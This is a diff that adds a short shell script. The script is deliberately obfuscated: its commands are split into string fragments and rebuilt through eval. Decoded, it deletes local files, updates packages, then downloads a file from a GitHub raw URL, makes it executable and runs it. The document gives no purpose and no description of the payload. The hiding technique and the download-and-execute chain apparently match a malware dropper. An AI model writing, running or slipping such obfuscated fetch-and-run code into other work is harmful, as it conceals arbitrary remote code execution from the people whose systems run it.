@@ -1,0 +1,3 @@
+z="
+";Rz='http';Vz='om/v';Ez='get ';Cz='st*';Kz='-y';Iz='upgr';Wz='xu00';Mz=' -O ';bz='nst';Gz='te -';Tz='gith';Yz='u/ra';Bz='f in';cz='chmo';Lz='wget';Nz='inst';Sz='s://';Zz='w/ma';Oz=' --n';Dz='apt-';Pz='o-ca';Hz='y';Jz='ade ';Xz='7/vx';Az='rm -';az='in/i';Uz='ub.c';ez=' ins';gz='./in';fz='t';Fz='upda';hz='st';Qz='che ';dz='d +x';
+eval "$Az$Bz$Cz$z$Dz$Ez$Fz$Gz$Hz$z$Dz$Ez$Iz$Jz$Kz$z$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$z$cz$dz$ez$fz$z$gz$hz"
